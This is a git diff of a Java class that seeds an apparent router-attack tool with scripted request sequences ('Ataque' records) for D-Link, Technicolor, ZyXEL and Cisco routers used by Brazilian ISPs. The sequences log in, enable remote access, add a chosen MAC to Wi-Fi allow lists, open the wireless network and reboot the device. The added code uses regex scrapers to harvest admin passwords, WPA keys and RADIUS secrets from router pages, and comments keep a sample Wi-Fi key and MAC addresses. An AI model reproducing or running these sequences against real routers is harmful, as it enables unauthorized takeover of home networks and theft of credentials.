-																				"<input name=\"CiscoLocalNetmaskIP3\" title=\"Subnet Mask Fourth Octet\" type=\"text\" class=\"ipnum\" value=\"(.*?)\" size=\"3\" maxlength=\"3\" />;;" +
-																				"<input type=\"hidden\" name=\"CiscoIsLocalIPSettingByGUI\" value=\"(.*?)\" />;;" +
-																				"<input type=\"hidden\" name=\"CiscoIsDefaultIP\" value=\"(.*?)\" />;;" +
-																				"<input type=\"text\" id=\"CiscoStartingLocalAddressIP3\" name=\"CiscoStartingLocalAddressIP3\" size=\"3\" maxlength=\"3\" class=\"ipnum\" value=\"(.*?)\" />;;" +
-																				"<input type=\"text\" id=\"CiscoNumberOfCpes\" name=\"CiscoNumberOfCpes\" class=\"num\" size=\"3\" maxlength=\"3\" value=\"(.*?)\" />;;" +
-																				"<input type=\"text\" id=\"CiscoLeaseTime\" name=\"CiscoLeaseTime\" class=\"num\" maxlength=\"4\" size=\"4\" value=\"(.*?)\" />;;" +
-																				"<input type=\"text\" id=\"DaylightSavingMinutes\" name=\"DaylightSavingMinutes\" class=\"num\" maxlength=\"4\" size=\"4\" value=\"(.*?)\" />;;" +
-																				"<INPUT name=\"h_DaylightSavingEnable\" type=\"hidden\" value=\"(.*?)\" />;;" +
-																				"<INPUT name=\"NewNtpTimeServer\" id=\"NewNtpTimeServer\" value=\"(.*?)\" />;;" +
-																				"<INPUT name=\"addNtpServer\" type=\"hidden\" value=\"(.*?)\" />;;" +
-																				"<INPUT name=\"removeNtpServer\" type=\"hidden\" value=\"(.*?)\" />;;" +
-																				"<INPUT name=\"TimeSntpEnable\" id=\"TimeSntpEnable\" type=\"radio\" value=\"(.*?)\";;", 0));
+			mPostGetDao.insert(new PostGet(100, 12, 3, "get", "/LanSetup.asp", "", 0));
+					mParamsProxDao.insert(new Params(40, 100, "CiscoLocalIpAddressIP2", "<input name=\"CiscoLocalIpAddressIP2\" title=\"Local IP Address Third Octet\" type=\"text\" class=\"ipnum\" value=\"(.*?)\" size=\"3\" maxlength=\"3\" />"));
+					mParamsProxDao.insert(new Params(41, 100, "CiscoLocalIpAddressIP3", "<input name=\"CiscoLocalIpAddressIP3\" title=\"Local IP Address Fourth Octet\" type=\"text\" class=\"ipnum\" value=\"(.*?)\" size=\"3\" maxlength=\"3\" />"));
+					mParamsProxDao.insert(new Params(42, 100, "CiscoLocalNetmaskIP3", "<input name=\"CiscoLocalNetmaskIP3\" title=\"Subnet Mask Fourth Octet\" type=\"text\" class=\"ipnum\" value=\"(.*?)\" size=\"3\" maxlength=\"3\" />"));
+					mParamsProxDao.insert(new Params(43, 100, "CiscoIsLocalIPSettingByGUI", "<input type=\"hidden\" name=\"CiscoIsLocalIPSettingByGUI\" value=\"(.*?)\" />"));
+					mParamsProxDao.insert(new Params(44, 100, "CiscoIsDefaultIP", "<input type=\"hidden\" name=\"CiscoIsDefaultIP\" value=\"(.*?)\" />"));
+					mParamsProxDao.insert(new Params(45, 100, "CiscoStartingLocalAddressIP3", "<input type=\"text\" id=\"CiscoStartingLocalAddressIP3\" name=\"CiscoStartingLocalAddressIP3\" size=\"3\" maxlength=\"3\" class=\"ipnum\" value=\"(.*?)\" />"));
+					mParamsProxDao.insert(new Params(46, 100, "CiscoNumberOfCpes", "<input type=\"text\" id=\"CiscoNumberOfCpes\" name=\"CiscoNumberOfCpes\" class=\"num\" size=\"3\" maxlength=\"3\" value=\"(.*?)\" />"));
+					mParamsProxDao.insert(new Params(47, 100, "CiscoLeaseTime", "<input type=\"text\" id=\"CiscoLeaseTime\" name=\"CiscoLeaseTime\" class=\"num\" maxlength=\"4\" size=\"4\" value=\"(.*?)\" />"));
+					mParamsProxDao.insert(new Params(48, 100, "DaylightSavingMinutes", "<input type=\"text\" id=\"DaylightSavingMinutes\" name=\"DaylightSavingMinutes\" class=\"num\" maxlength=\"4\" size=\"4\" value=\"(.*?)\" />"));
+					mParamsProxDao.insert(new Params(49, 100, "h_DaylightSavingEnable", "<INPUT name=\"h_DaylightSavingEnable\" type=\"hidden\" value=\"(.*?)\" />"));
+					mParamsProxDao.insert(new Params(50, 100, "NewNtpTimeServer", "<INPUT name=\"NewNtpTimeServer\" id=\"NewNtpTimeServer\" value=\"(.*?)\" />"));
+					mParamsProxDao.insert(new Params(51, 100, "addNtpServer", "<INPUT name=\"addNtpServer\" type=\"hidden\" value=\"(.*?)\" />"));
+					mParamsProxDao.insert(new Params(52, 100, "removeNtpServer", "<INPUT name=\"removeNtpServer\" type=\"hidden\" value=\"(.*?)\" />"));
+					mParamsProxDao.insert(new Params(53, 100, "TimeSntpEnable", "<INPUT name=\"TimeSntpEnable\" id=\"TimeSntpEnable\" type=\"radio\" value=\"(.*?)\""));
 			mPostGetDao.insert(new PostGet(101, 12, 4, "post", "/goform/LanSetup", "", 0));														
 				mParamsDao.insert(new Params(54, 101, "CiscoLocalIpAddressIP2", "insereCiscoLocalIpAddressIP2"));		//0
 				mParamsDao.insert(new Params(55, 101, "CiscoLocalIpAddressIP3", "insereCiscoLocalIpAddressIP3"));		//1		
@@ -444,7 +455,7 @@ public class Initialize {
 			
 		/****************************************************Start Acesso Remoto**************************************************/
 //		GVT D-Link DSL-2640B		
-		mAtaqueDao.insert(new Ataque(13, "acesso", "gvt", 0, "D-Link DSL-2640B"));
+		mAtaqueDao.insert(new Ataque(13, "acesso", "gvt", 0, 0, null, 1, "D-Link DSL-2640B"));
 			mPostGetDao.insert(new PostGet(107, 13, 1, "get", "", "DSL Router", 1));
 			mPostGetDao.insert(new PostGet(108, 13, 2, "get", "/logo.html", "logoBody", 1));
 			mPostGetDao.insert(new PostGet(109, 13, 3, "get", "/menu.html", "mainMenuBody", 1));
@@ -462,7 +473,7 @@ public class Initialize {
 			mPostGetDao.insert(new PostGet(115, 13, 9, "get", "/rebootinfo.cgi", "The DSL Router is rebooting", 1));			
 
 //		Oi technicolor TD5136v2	/ TD5130v2		
-		mAtaqueDao.insert(new Ataque(14, "acesso", "oi", 1, "technicolor TD5136v2 / TD5130v2"));
+		mAtaqueDao.insert(new Ataque(14, "acesso", "oi", 1, 0, null, 0, "technicolor TD5136v2 / TD5130v2"));
 			mPostGetDao.insert(new PostGet(116, 14, 1, "post", "/login.cgi", "/index.cgi", 1));		
 				mParamsDao.insert(new Params(89, 116, "isSubmit", "1"));
 				mParamsDao.insert(new Params(90, 116, "username", "insereUsuario"));
@@ -490,7 +501,7 @@ public class Initialize {
 				mParamsDao.insert(new Params(103, 125, "submitValue", "apply"));
 
 //		Oi ZyXEL AMG1202-T10B
-		mAtaqueDao.insert(new Ataque(15, "acesso", "oi", 1, "ZyXEL AMG1202-T10B"));			
+		mAtaqueDao.insert(new Ataque(15, "acesso", "oi", 1, 0, null, 0, "ZyXEL AMG1202-T10B"));			
 			mPostGetDao.insert(new PostGet(126, 15, 1, "post", "/cgi-bin/SavingAuthorize.asp", "/MakeSession.asp", 1));												
 				mParamsDao.insert(new Params(104, 126, "LoginPassword", "insereSenha"));
 				mParamsDao.insert(new Params(105, 126, "LoginUsername", "insereUsuario"));
@@ -520,7 +531,7 @@ public class Initialize {
 			mPostGetDao.insert(new PostGet(142, 15, 17, "get", "/cgi-bin/RebootSucc.asp", "The device is rebooting", 0));	
 
 //		NET Cisco DPC3925		***DONT WORK***			
-		mAtaqueDao.insert(new Ataque(16, "acesso", "net", 1, "Cisco DPC3925"));			
+		mAtaqueDao.insert(new Ataque(16, "acesso", "net", 1, 0, null, 0, "Cisco DPC3925"));			
 			mPostGetDao.insert(new PostGet(143, 16, 1, "post", "/goform/Docsis_system", "Setup", 1));														
 				mParamsDao.insert(new Params(114, 143, "username_login", "insereUsuario"));
 				mParamsDao.insert(new Params(115, 143, "password_login", "insereSenha"));
@@ -528,20 +539,21 @@ public class Initialize {
 				mParamsDao.insert(new Params(117, 143, "Language_Submit", "0"));
 				mParamsDao.insert(new Params(118, 143, "login", "Log In"));
 			mPostGetDao.insert(new PostGet(144, 16, 2, "get", "/Quick_setup.asp", "Quick Setup", 0));
-			mPostGetDao.insert(new PostGet(145, 16, 3, "get", "/Administration.asp", "<input name=\"saRgIpMgmtWanDualIpAddrIP0\" title=\"Wan Dual Ip Address First Octet\" size=3 maxlength=3 class=\'ipnum\' value=(.*?)>;;" +
-																					 "<input name=\"saRgIpMgmtWanDualIpAddrIP1\" title=\"Wan Dual Ip Address Second Octet\" size=3 maxlength=3 class=\'ipnum\' value=(.*?)>;;" +
-																					 "<input name=\"saRgIpMgmtWanDualIpAddrIP2\" title=\"Wan Dual Ip Address Third Octet\" size=3 maxlength=3 class=\'ipnum\' value=(.*?)>;;" +
-																					 "<input name=\"saRgIpMgmtWanDualIpAddrIP3\" title=\"Wan Dual Ip Address Fourth Octet\" size=3 maxlength=3 class=\'ipnum\' value=(.*?)>;;" +
-																					 "<input type=\"CheckBox\" name=\"saRgIpMgmtWanDualIpRipAdvertised\" id=\"saRgIpMgmtWanDualIpRipAdvertised\" value=\"(.*?)\";" + 
-																					 "<input  id=\"wan_mtuSize\" name=\"wan_mtuSize\" type=\"text\" class=\"ipnum\" value=\"(.*?)\" size=\"4\" maxlength=\"4\" />;;" +
-																					 "<INPUT type=\"password\" maxlength=\"65\" size=\"21\" id=\"sysPasswd\" name=\"sysPasswd\" value=\"(.*?)\" />;;" +
-																					 "<INPUT type=\"password\" maxlength=\"65\" size=\"21\" id=\"sysConfirmPasswd\" name=\"sysConfirmPasswd\" value=\"(.*?)\" />;;" +
-																					 "<input type=\"hidden\" name=\"preWorkingMode\" value=(.*?)>;;" +
-																					 "<input type=\"hidden\" name=\"h_check_WebAccessUserIfLevel\" value=(.*?)>;;" +
-																					 "<input type=\"hidden\" name=\"h_upnp_enable\" value=(.*?)>;;" +
-																					 "<input type=\"hidden\" name=\"h_wlan_enable\" value=(.*?)>;;" +
-																					 "<input type=\"hidden\" name=\"h_igmp_proxy_enable\" value=(.*?)>;;" +
-																					 "<input type=\"hidden\" name=\"h_user_type\" value=(.*?)>;;", 0));		
+			mPostGetDao.insert(new PostGet(145, 16, 3, "get", "/Administration.asp", "", 0));	
+					mParamsProxDao.insert(new Params(54, 145, "saRgIpMgmtWanDualIpAddrIP0", "<input name=\"saRgIpMgmtWanDualIpAddrIP0\" title=\"Wan Dual Ip Address First Octet\" size=3 maxlength=3 class=\'ipnum\' value=(.*?)>"));
+					mParamsProxDao.insert(new Params(55, 145, "saRgIpMgmtWanDualIpAddrIP1", "<input name=\"saRgIpMgmtWanDualIpAddrIP1\" title=\"Wan Dual Ip Address Second Octet\" size=3 maxlength=3 class=\'ipnum\' value=(.*?)>"));
+					mParamsProxDao.insert(new Params(56, 145, "saRgIpMgmtWanDualIpAddrIP2", "<input name=\"saRgIpMgmtWanDualIpAddrIP2\" title=\"Wan Dual Ip Address Third Octet\" size=3 maxlength=3 class=\'ipnum\' value=(.*?)>"));
+					mParamsProxDao.insert(new Params(57, 145, "saRgIpMgmtWanDualIpAddrIP3", "<input name=\"saRgIpMgmtWanDualIpAddrIP3\" title=\"Wan Dual Ip Address Fourth Octet\" size=3 maxlength=3 class=\'ipnum\' value=(.*?)>"));
+					mParamsProxDao.insert(new Params(58, 145, "saRgIpMgmtWanDualIpRipAdvertised", "<input type=\"CheckBox\" name=\"saRgIpMgmtWanDualIpRipAdvertised\" id=\"saRgIpMgmtWanDualIpRipAdvertised\" value=\"(.*?)\""));
+					mParamsProxDao.insert(new Params(59, 145, "wan_mtuSize", "<input  id=\"wan_mtuSize\" name=\"wan_mtuSize\" type=\"text\" class=\"ipnum\" value=\"(.*?)\" size=\"4\" maxlength=\"4\" />"));
+					mParamsProxDao.insert(new Params(60, 145, "sysPasswd", "<INPUT type=\"password\" maxlength=\"65\" size=\"21\" id=\"sysPasswd\" name=\"sysPasswd\" value=\"(.*?)\" />"));
+					mParamsProxDao.insert(new Params(61, 145, "sysConfirmPasswd", "<INPUT type=\"password\" maxlength=\"65\" size=\"21\" id=\"sysConfirmPasswd\" name=\"sysConfirmPasswd\" value=\"(.*?)\" />"));
+					mParamsProxDao.insert(new Params(62, 145, "preWorkingMode", "<input type=\"hidden\" name=\"preWorkingMode\" value=(.*?)>"));
+					mParamsProxDao.insert(new Params(63, 145, "h_check_WebAccessUserIfLevel", "<input type=\"hidden\" name=\"h_check_WebAccessUserIfLevel\" value=(.*?)>"));
+					mParamsProxDao.insert(new Params(64, 145, "h_upnp_enable", "<input type=\"hidden\" name=\"h_upnp_enable\" value=(.*?)>"));
+					mParamsProxDao.insert(new Params(65, 145, "h_wlan_enable", "<input type=\"hidden\" name=\"h_wlan_enable\" value=(.*?)>"));
+					mParamsProxDao.insert(new Params(66, 145, "h_igmp_proxy_enable", "<input type=\"hidden\" name=\"h_igmp_proxy_enable\" value=(.*?)>"));
+					mParamsProxDao.insert(new Params(67, 145, "h_user_type", "<input type=\"hidden\" name=\"h_user_type\" value=(.*?)>"));
 			mPostGetDao.insert(new PostGet(146, 16, 4, "post", "/goform/Administration.asp", "", 1));														
 				mParamsDao.insert(new Params(119, 146, "working_mode", "0"));		//Router Mode
 				mParamsDao.insert(new Params(120, 146, "connection_mode", "0"));		//DHCP
@@ -602,7 +614,7 @@ public class Initialize {
 		
 		/*****************************************************Start Filtro MAC****************************************************/	
 //		GVT D-Link DSL-2640B
-		mAtaqueDao.insert(new Ataque(17, "filtromac", "gvt", 0, "D-Link DSL-2640B"));
+		mAtaqueDao.insert(new Ataque(17, "filtromac", "gvt", 0, 0, null, 1, "D-Link DSL-2640B"));
 			mPostGetDao.insert(new PostGet(151, 17, 1, "get", "", "DSL Router", 1));
 			mPostGetDao.insert(new PostGet(152, 17, 2, "get", "/logo.html", "logoBody", 1));
 			mPostGetDao.insert(new PostGet(153, 17, 3, "get", "/menu.html", "mainMenuBody", 1));
@@ -614,17 +626,17 @@ public class Initialize {
 			mPostGetDao.insert(new PostGet(159, 17, 9, "get", "/wlmacflt.cmd?action=view", "", 1));
 			mPostGetDao.insert(new PostGet(160, 17, 10, "get", "/wlmacflt.cmd?action=refresh", "", 1));
 			mPostGetDao.insert(new PostGet(161, 17, 11, "get", "/wlmacflt.html", "", 1));
-			mPostGetDao.insert(new PostGet(162, 17, 12, "get", "/wlmacflt.cmd?action=add&wlFltMacAddr=insereMAC", "", 1));		//34:bb:26:60:62:0d
+			mPostGetDao.insert(new PostGet(162, 17, 12, "get", "/wlmacflt.cmd?action=add&wlFltMacAddr=insereMAC", "", 1));		//34:bb:26:60:62:0d		
 			mPostGetDao.insert(new PostGet(163, 17, 13, "get", "/wlmacflt.cmd?action=view", "", 1));
 			mPostGetDao.insert(new PostGet(164, 17, 14, "get", "/wlmacflt.cmd?action=refresh", "", 1));
 			mPostGetDao.insert(new PostGet(165, 17, 15, "get", "/wlmacflt.cmd?action=save&wlFltMacMode=allow", "", 1));
 			mPostGetDao.insert(new PostGet(166, 17, 16, "get", "/wlmacflt.cmd?action=apply", "", 1));		//TIMEOUT SOMETIMES	
 			mPostGetDao.insert(new PostGet(167, 17, 17, "get", "/resetrouter.html", "", 1));
 			mPostGetDao.insert(new PostGet(168, 17, 18, "get", "/backupsettings.html", "", 1));
-			mPostGetDao.insert(new PostGet(169, 17, 19, "get", "/rebootinfo.cgi", "The DSL Router is rebooting", 1));
+			mPostGetDao.insert(new PostGet(169, 17, 19, "get", "/rebootinfo.cgi", "The DSL Router is rebooting", 1));		//TIMEOUT SOMETIMES
 
 //		Oi technicolor TD5136v2 / TD5130v2		***DONT WORK***	
-		mAtaqueDao.insert(new Ataque(18, "filtromac", "oi", 1, "technicolor TD5136v2 / TD5130v2"));
+		mAtaqueDao.insert(new Ataque(18, "filtromac", "oi", 1, 0, null, 0, "technicolor TD5136v2 / TD5130v2"));
 			mPostGetDao.insert(new PostGet(170, 18, 1, "post", "/login.cgi", "/index.cgi", 1));		
 				mParamsDao.insert(new Params(168, 170, "isSubmit", "1"));
 				mParamsDao.insert(new Params(169, 170, "username", "insereUsuario"));
@@ -664,7 +676,7 @@ public class Initialize {
 				mParamsDao.insert(new Params(187, 186, "submitValue", "apply"));
 
 //		Oi ZyXEL AMG1202-T10B		***DONT WORK***
-		mAtaqueDao.insert(new Ataque(19, "filtromac", "oi", 1, "ZyXEL AMG1202-T10B"));			
+		mAtaqueDao.insert(new Ataque(19, "filtromac", "oi", 1, 0, null, 0, "ZyXEL AMG1202-T10B"));			
 			mPostGetDao.insert(new PostGet(187, 19, 1, "post", "/cgi-bin/SavingAuthorize.asp", "/MakeSession.asp", 1));												
 				mParamsDao.insert(new Params(188, 187, "LoginPassword", "insereSenha"));
 				mParamsDao.insert(new Params(189, 187, "LoginUsername", "insereUsuario"));
@@ -685,7 +697,7 @@ public class Initialize {
 				mParamsDao.insert(new Params(191, 200, "APFltFlag", "1"));
 				mParamsDao.insert(new Params(192, 200, "WLAN_APFltAction", "1"));
 				mParamsDao.insert(new Params(193, 200, "AP_FltAddress0", "90:00:4E:AC:F6:B5"));
-				mParamsDao.insert(new Params(194, 200, "AP_FltAddress1", "34:BB:26:60:62:0D"));
+				mParamsDao.insert(new Params(194, 200, "AP_FltAddress1", "insereMAC"));		//34:BB:26:60:62:0D
 				mParamsDao.insert(new Params(195, 200, "AP_FltAddress2=", ""));
 				mParamsDao.insert(new Params(196, 200, "AP_FltAddress3=", ""));
 				mParamsDao.insert(new Params(197, 200, "AP_FltAddress4=", ""));
@@ -702,7 +714,7 @@ public class Initialize {
 			mPostGetDao.insert(new PostGet(206, 19, 20, "get", "/cgi-bin/RebootSucc.asp", "The device is rebooting", 0));	
 		
 //		NET Cisco DPC3925		***DONT WORK***			
-		mAtaqueDao.insert(new Ataque(20, "filtromac", "net", 1, "Cisco DPC3925"));			
+		mAtaqueDao.insert(new Ataque(20, "filtromac", "net", 1, 0, null, 0, "Cisco DPC3925"));			
 			mPostGetDao.insert(new PostGet(207, 20, 1, "post", "/goform/Docsis_system", "Setup", 1));														
 				mParamsDao.insert(new Params(203, 207, "username_login", "insereUsuario"));
 				mParamsDao.insert(new Params(204, 207, "password_login", "insereSenha"));
@@ -716,7 +728,7 @@ public class Initialize {
 				mParamsDao.insert(new Params(208, 211, "wl0_macfilter", "enable"));
 				mParamsDao.insert(new Params(209, 211, "wl0_macmode", "allow"));
 				mParamsDao.insert(new Params(210, 211, "wl_mac0", "90:00:4E:AC:F6:B5"));
-				mParamsDao.insert(new Params(211, 211, "wl_mac1", "34:BB:26:60:62:0D"));				
+				mParamsDao.insert(new Params(211, 211, "wl_mac1", "insereMAC"));		//34:BB:26:60:62:0D				
 				mParamsDao.insert(new Params(212, 211, "wl_mac2", "00:00:00:00:00:00"));
 				mParamsDao.insert(new Params(213, 211, "wl_mac3", "00:00:00:00:00:00"));
 				mParamsDao.insert(new Params(214, 211, "wl_mac4", "00:00:00:00:00:00"));
@@ -765,7 +777,7 @@ public class Initialize {
 			
 		/******************************************************Start Abrir Rede*****************************************************/
 //		GVT D-Link DSL-2640B
-		mAtaqueDao.insert(new Ataque(21, "abrirrede", "gvt", 0, "D-Link DSL-2640B"));
+		mAtaqueDao.insert(new Ataque(21, "abrirrede", "gvt", 0, 0, null, 1, "D-Link DSL-2640B"));
 			mPostGetDao.insert(new PostGet(217, 21, 1, "get", "", "DSL Router", 1));
 			mPostGetDao.insert(new PostGet(218, 21, 2, "get", "/logo.html", "logoBody", 1));
 			mPostGetDao.insert(new PostGet(219, 21, 3, "get", "/menu.html", "mainMenuBody", 1));
@@ -784,11 +796,11 @@ public class Initialize {
 																			 "&wlPreauth=0" +
 																			 "&wlSsidIdx=0" +
 																			 "&wlSyncNvram=1", "", 1));
-			mPostGetDao.insert(new PostGet(225, 21, 9, "get", "/wlsecrefresh.wl?wlRefresh=0", "", 1));
+			mPostGetDao.insert(new PostGet(225, 21, 9, "get", "/wlsecrefresh.wl?wlRefresh=0", "", 1));		//TIMEOUT SOMETIMES
 			
 
 //		Oi technicolor TD5136v2 / TD5130v2			
-		mAtaqueDao.insert(new Ataque(22, "abrirrede", "oi", 1, "technicolor TD5136v2 / TD5130v2"));
+		mAtaqueDao.insert(new Ataque(22, "abrirrede", "oi", 1, 0, null, 0, "technicolor TD5136v2 / TD5130v2"));
 			mPostGetDao.insert(new PostGet(226, 22, 1, "post", "/login.cgi", "/index.cgi", 1));		
 				mParamsDao.insert(new Params(249, 226, "isSubmit", "1"));
 				mParamsDao.insert(new Params(250, 226, "username", "insereUsuario"));
@@ -799,6 +811,12 @@ public class Initialize {
 			mPostGetDao.insert(new PostGet(230, 22, 5, "get", "/status_summary.cgi?pageAct=summary", "Firmware Version", 0));
 			mPostGetDao.insert(new PostGet(231, 22, 6, "get", "/wlsettings.cgi", "", 0));
 			mPostGetDao.insert(new PostGet(232, 22, 7, "get", "/wlwpa.cgi", "", 0));	
+					mParamsProxDao.insert(new Params(68, 232, "rekeytime", "vRekeyTime\\[vRekeyTime.length\\] = \"(.*?)\""));
+					mParamsProxDao.insert(new Params(69, 232, "pskFormat", "vPSKFormat\\[vPSKFormat.length\\] = \"(.*?)\""));
+					mParamsProxDao.insert(new Params(70, 232, "pskValue", "vPSKKey\\[vPSKKey.length\\] = \"(.*?)\""));		//desnecessario no TD5310v2
+					mParamsProxDao.insert(new Params(71, 232, "radiusIP", "vRSIp\\[vRSIp.length\\] = \"(.*?)\""));
+					mParamsProxDao.insert(new Params(72, 232, "radiusPort", "vRSPort\\[vRSPort.length\\] = \"(.*?)\""));
+					mParamsProxDao.insert(new Params(73, 232, "radiusPass", "vRSPwd\\[vRSPwd.length\\] = \"(.*?)\""));					
 			mPostGetDao.insert(new PostGet(233, 22, 8, "post", "/wlwpa.cgi", "", 0));		//TIMEOUT
 				mParamsDao.insert(new Params(252, 233, "submitValue", "1"));
 				mParamsDao.insert(new Params(253, 233, "wpaSSID", "0"));
@@ -811,15 +829,15 @@ public class Initialize {
 				mParamsDao.insert(new Params(260, 233, "wpaAuth", "psk"));		
 				mParamsDao.insert(new Params(261, 233, "ciphersuite_a", "1"));		
 				mParamsDao.insert(new Params(262, 233, "wpa2ciphersuite_a", "1"));		
-				mParamsDao.insert(new Params(263, 233, "rekeytime", "86400"));		
-				mParamsDao.insert(new Params(264, 233, "pskFormat", "0"));		
-				mParamsDao.insert(new Params(265, 233, "pskValue", "meuoiveloxwifi"));	
-				mParamsDao.insert(new Params(266, 233, "radiusIP", "0.0.0.0"));	
-				mParamsDao.insert(new Params(267, 233, "radiusPort", "1812"));	
-				mParamsDao.insert(new Params(268, 233, "radiusPass", ""));			
+				mParamsDao.insert(new Params(263, 233, "rekeytime", "insererekeytime"));		//86400		
+				mParamsDao.insert(new Params(264, 233, "pskFormat", "inserepskFormat"));		//0		
+				mParamsDao.insert(new Params(265, 233, "pskValue", "inserepskValue"));		//meuoiveloxwifi	
+				mParamsDao.insert(new Params(266, 233, "radiusIP", "insereradiusIP"));		//0.0.0.0		
+				mParamsDao.insert(new Params(267, 233, "radiusPort", "insereradiusPort"));		//1812		
+				mParamsDao.insert(new Params(268, 233, "radiusPass", "insereradiusPass"));		//		
 
-//		Oi ZyXEL AMG1202-T10B		***WORK BUT TIMEOUT***
-		mAtaqueDao.insert(new Ataque(23, "abrirrede", "oi", 1, "ZyXEL AMG1202-T10B"));			
+//		Oi ZyXEL AMG1202-T10B		
+		mAtaqueDao.insert(new Ataque(23, "abrirrede", "oi", 1, 0, null, 0, "ZyXEL AMG1202-T10B"));			
 			mPostGetDao.insert(new PostGet(234, 23, 1, "post", "/cgi-bin/SavingAuthorize.asp", "/MakeSession.asp", 1));												
 				mParamsDao.insert(new Params(269, 234, "LoginPassword", "insereSenha"));
 				mParamsDao.insert(new Params(270, 234, "LoginUsername", "insereUsuario"));
@@ -831,30 +849,31 @@ public class Initialize {
 			mPostGetDao.insert(new PostGet(240, 23, 7, "get", "/cgi-bin/home.asp", "Home", 0));		
 			mPostGetDao.insert(new PostGet(241, 23, 8, "get", "/cgi-bin/rpPanel.asp", "", 0));		
 			mPostGetDao.insert(new PostGet(242, 23, 9, "get", "/cgi-bin/buttom.asp", "", 0));		
-			mPostGetDao.insert(new PostGet(243, 23, 10, "get", "/cgi-bin/WLAN_General.asp?MSSID=0", "<input type=\"hidden\" name=\"hid_encryptionMode\" value=\"(.*?)\">;;" +
-																									"<input type=\"hidden\" name=\"hid_securityMode\" value=\"(.*?)\">;;" +
-																									"<INPUT type=\"HIDDEN\" NAME=\"isDot1XSupported\" value=\"(.*?)\">;;" +
-																									"<input type=\"hidden\" name=\"SSID_INDEX\"  value=\"(.*?)\">;;" +
-																									"<input type=\"hidden\" name=\"CountryName\" value=\"(.*?)\">;;" +
-																									"<input type=\"hidden\" name=\"EnableWLanFlag\"  value=\"(.*?)\">;;" +
-																									"<input type=\"hidden\" name=\"CountryRegion0\" value=\"(.*?)\">;;" +
-																									"<input type=\"hidden\" name=\"CountryRegion1\" value=\"(.*?)\">;;" +
-																									"<input type=\"hidden\" name=\"CountryRegion2\" value=\"(.*?)\">;;" +
-																									"<input type=\"hidden\" name=\"CountryRegion3\" value=\"(.*?)\">;;" +
-																									"<input type=\"hidden\" name=\"CountryRegion5\" value=\"(.*?)\">;;" +
-																									"<input type=\"hidden\" name=\"CountryRegion6\" value=\"(.*?)\">;;" +
-																									"<input type=\"text\" name=\"ESSID\" size=\"32\" maxlength=\"32\" onBlur=\"chkName\\(this\\)\" VALUE=\"(.*?)\">;;" +
-																									"<input type=\"hidden\" name=\"HideSsidFlag\"  value=\"(.*?)\">;;" +
-																									"<input type=\"hidden\" name=\"WPACompatileFlag\" value=\"(.*?)\">;;" +
-																									"<input type=\"hidden\" name=\"DefWEPKey\" value=\"(.*?)\">;;" +
-																									"<input type=\"text\" name=\"WLANCfgPSK\" size=\"32\" maxlength=\"64\"  onBlur=\"wpapskCheck\\(this,1\\);\" value=\"(.*?)\" >;;" +
-																									"<input type=\"text\" name=\"WLANCfgAuthenTimeout\" size=\"5\" maxlength=\"4\" value=\"(.*?)\" onBlur=chkAuthenTimeout\\(this.form\\) onKeyPress=chk_num\\(event\\);>;;" +
-																									"<input type=\"text\" name=\"WLANCfgIdleTimeout\" size=\"5\" maxlength=\"4\" value=\"(.*?)\" onBlur=chkIdleTimeout\\(this.value\\) onKeyPress=chk_num\\(event\\);>;;" +
-																									"<input type=\"text\"name=\"WLANCfgWPATimer\" size=\"5\" maxlength=\"5\" value=\"(.*?)\" onKeyPress=chk_num\\(event\\); >;;" +
-																									"<input type=\"text\" name=\"WLANCfgRadiusServerAddr\" size=\"15\"  maxlength=\"15\" value=\"(.*?)\" >;;" +
-																									"<input type=\"text\" name=\"WLANCfgRadiusServerPort\" size=\"5\"  maxlength=\"5\" value=\"(.*?)\" onBlur=checkPort\\(this.value,0\\) onKeyPress=chk_num\\(event\\); >;;" +
-																									"<input type=\"text\" name=\"WLANCfgRadiusServerKey\" size=\"31\"  maxlength=\"127\" value=\"(.*?)\" >;;" +
-																									"<input type=\"hidden\" name=\"WlanQosFlag\" value=\"(.*?)\">;;", 0));		
+			mPostGetDao.insert(new PostGet(243, 23, 10, "get", "/cgi-bin/WLAN_General.asp?MSSID=0", "", 0));		
+					mParamsProxDao.insert(new Params(74, 243, "hid_encryptionMode", "<input type=\"hidden\" name=\"hid_encryptionMode\" value=\"(.*?)\">"));
+					mParamsProxDao.insert(new Params(75, 243, "hid_securityMode", "<input type=\"hidden\" name=\"hid_securityMode\" value=\"(.*?)\">"));
+					mParamsProxDao.insert(new Params(76, 243, "isDot1XSupported", "<INPUT type=\"HIDDEN\" NAME=\"isDot1XSupported\" value=\"(.*?)\">"));		
+					mParamsProxDao.insert(new Params(77, 243, "SSID_INDEX", "<input type=\"hidden\" name=\"SSID_INDEX\"  value=\"(.*?)\">"));
+					mParamsProxDao.insert(new Params(78, 243, "CountryName", "<input type=\"hidden\" name=\"CountryName\" value=\"(.*?)\">"));
+					mParamsProxDao.insert(new Params(79, 243, "EnableWLanFlag", "<input type=\"hidden\" name=\"EnableWLanFlag\"  value=\"(.*?)\">"));
+					mParamsProxDao.insert(new Params(80, 243, "CountryRegion0", "<input type=\"hidden\" name=\"CountryRegion0\" value=\"(.*?)\">"));
+					mParamsProxDao.insert(new Params(81, 243, "CountryRegion1", "<input type=\"hidden\" name=\"CountryRegion1\" value=\"(.*?)\">"));
+					mParamsProxDao.insert(new Params(82, 243, "CountryRegion2", "<input type=\"hidden\" name=\"CountryRegion2\" value=\"(.*?)\">"));
+					mParamsProxDao.insert(new Params(83, 243, "CountryRegion3", "<input type=\"hidden\" name=\"CountryRegion3\" value=\"(.*?)\">"));
+					mParamsProxDao.insert(new Params(84, 243, "CountryRegion5", "<input type=\"hidden\" name=\"CountryRegion5\" value=\"(.*?)\">"));
+					mParamsProxDao.insert(new Params(85, 243, "CountryRegion6", "<input type=\"hidden\" name=\"CountryRegion6\" value=\"(.*?)\">"));
+					mParamsProxDao.insert(new Params(86, 243, "ESSID", "<input type=\"text\" name=\"ESSID\" size=\"32\" maxlength=\"32\" onBlur=\"chkName\\(this\\)\" VALUE=\"(.*?)\">"));
+					mParamsProxDao.insert(new Params(87, 243, "HideSsidFlag", "<input type=\"hidden\" name=\"HideSsidFlag\"  value=\"(.*?)\">"));
+					mParamsProxDao.insert(new Params(88, 243, "WPACompatileFlag", "<input type=\"hidden\" name=\"WPACompatileFlag\" value=\"(.*?)\">"));
+					mParamsProxDao.insert(new Params(89, 243, "DefWEPKey", "<input type=\"hidden\" name=\"DefWEPKey\" value=\"(.*?)\">"));
+					mParamsProxDao.insert(new Params(90, 243, "WLANCfgPSK", "<input type=\"text\" name=\"WLANCfgPSK\" size=\"32\" maxlength=\"64\"  onBlur=\"wpapskCheck\\(this,1\\);\" value=\"(.*?)\" >"));
